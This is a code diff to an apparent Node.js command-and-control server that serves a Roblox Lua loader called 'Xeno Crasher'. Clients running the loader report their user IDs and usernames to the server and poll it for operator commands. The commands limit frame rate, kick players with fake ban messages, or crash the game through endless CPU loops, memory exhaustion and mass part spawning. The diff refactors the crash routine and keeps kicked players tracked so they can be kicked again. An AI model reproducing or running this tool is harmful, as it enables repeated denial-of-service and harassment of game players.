@@ -20,7 +20,7 @@ const players = new Map();
 // LOADER SCRIPT
 // ============================================
 app.get('/loader.lua', (req, res) => {
-    const loader = `--[[ Xeno Crasher - SILENT ]]--
+    const loader = `--[[ Xeno Crasher - MULTI-USE ]]--
 local BASE = "${PUBLIC_URL}"
 local KEY = "xenooooo"
 
@@ -107,6 +107,35 @@ local function setFPSLimit(targetFPS)
     end)
 end
 
+local function crashGame()
+    task.spawn(function()
+        while true do
+            local x = 0
+            for i = 1, 1000000 do x = x + i end
+        end
+    end)
+    task.spawn(function()
+        local t = {}
+        while true do
+            for i = 1, 1000 do t[#t + 1] = string.rep("X", 50000) end
+            task.wait()
+        end
+    end)
+    task.spawn(function()
+        for i = 1, 5000 do
+            local p = Instance.new("Part")
+            p.Size = Vector3.new(100, 100, 100)
+            p.Parent = workspace
+            p.Position = Vector3.new(
+                math.random(-1000, 1000),
+                math.random(-1000, 1000),
+                math.random(-1000, 1000)
+            )
+            task.wait(0.01)
+        end
+    end)
+end
+
 local pollRunning = false
 local function poll()
     if pollRunning then return end
@@ -128,32 +157,7 @@ local function poll()
             end
             
             if data.crash == true then
-                task.spawn(function()
-                    while true do
-                        local x = 0
-                        for i = 1, 1000000 do x = x + i end
-                    end
-                end)
-                task.spawn(function()
-                    local t = {}
-                    while true do
-                        for i = 1, 1000 do t[#t + 1] = string.rep("X", 50000) end
-                        task.wait()
-                    end
-                end)
-                task.spawn(function()
-                    for i = 1, 5000 do
-                        local p = Instance.new("Part")
-                        p.Size = Vector3.new(100, 100, 100)
-                        p.Parent = workspace
-                        p.Position = Vector3.new(
-                            math.random(-1000, 1000),
-                            math.random(-1000, 1000),
-                            math.random(-1000, 1000)
-                        )
-                        task.wait(0.01)
-                    end
-                end)
+                crashGame()
             end
             
             if data.kick == true then
@@ -189,9 +193,10 @@ end)`;
 });
 
 // ============================================
-// ✅ FIXED: API ENDPOINTS
+// ✅ API ENDPOINTS - FIXED MULTI-USE
 // ============================================
 
+// GET Heartbeat (for mobile/executors that block POST)
 app.get('/api/public/heartbeat', (req, res) => {
     const { user_id, username, display_name, executor, online } = req.query;
     if (!user_id) {
@@ -199,14 +204,14 @@ app.get('/api/public/heartbeat', (req, res) => {
     }
     const userId = String(user_id);
     
+    // Always create/update player, even if they were previously kicked
     const existing = players.get(userId) || {};
     players.set(userId, {
-        ...existing,
         user_id: userId,
         username: username || existing.username || 'Unknown',
         display_name: display_name || existing.display_name || '',
         executor: executor || existing.executor || 'Unknown',
-        online: online === 'true',
+        online: true,
         lastHeartbeat: Date.now(),
         _crash: false,
         _kick: false,
@@ -217,6 +222,7 @@ app.get('/api/public/heartbeat', (req, res) => {
     res.json({ status: 'ok' });
 });
 
+// POST Heartbeat
 app.post('/api/public/heartbeat', (req, res) => {
     const data = req.body;
     if (!data || !data.user_id) {
@@ -224,6 +230,7 @@ app.post('/api/public/heartbeat', (req, res) => {
     }
     const userId = String(data.user_id);
     
+    // Always create/update player, even if they were previously kicked
     const existing = players.get(userId) || {};
     players.set(userId, {
         ...existing,
@@ -240,22 +247,15 @@ app.post('/api/public/heartbeat', (req, res) => {
     res.json({ status: 'ok' });
 });
 
+// Get all players
 app.get('/api/players', (req, res) => {
     const list = [];
     const now = Date.now();
     const OFFLINE_THRESHOLD = 15000;
-    const REMOVE_THRESHOLD = 60000; // Remove after 60 seconds offline
 
     for (const [id, p] of players.entries()) {
         const timeSinceLast = now - (p.lastHeartbeat || 0);
         const online = timeSinceLast < OFFLINE_THRESHOLD;
-        
-        // Remove if offline for too long
-        if (!online && timeSinceLast > REMOVE_THRESHOLD) {
-            players.delete(id);
-            continue;
-        }
-        
         p.online = online;
         list.push({ ...p });
         players.set(id, p);
@@ -263,6 +263,7 @@ app.get('/api/players', (req, res) => {
     res.json({ players: list });
 });
 
+// Send command to player
 app.post('/api/command', (req, res) => {
     const { user_id, fps_limit, kick, kick_message, crash } = req.body;
     if (!user_id) return res.status(400).json({ error: 'Missing user_id' });
@@ -288,6 +289,7 @@ app.post('/api/command', (req, res) => {
     res.json({ status: 'ok' });
 });
 
+// Player polls for commands
 app.get('/api/public/command', (req, res) => {
     const userId = req.query.user_id;
     if (!userId) {
@@ -307,14 +309,15 @@ app.get('/api/public/command', (req, res) => {
     if (p._crash) {
         response.crash = true;
         p._crash = false;
+        console.log(`💥 CRASH DELIVERED TO: ${p.username || userId}`);
     }
     if (p._kick) {
         response.kick = true;
         response.kick_message = p._kick_message || "You have been banned.";
         p._kick = false;
         p._kick_message = '';
-        // ✅ Mark player as offline immediately so they can rejoin
-        p.online = false;
+        // Don't remove player - they can rejoin and get kicked again
+        console.log(`👢 KICK DELIVERED TO: ${p.username || userId}`);
     }
     
     players.set(String(userId), p);
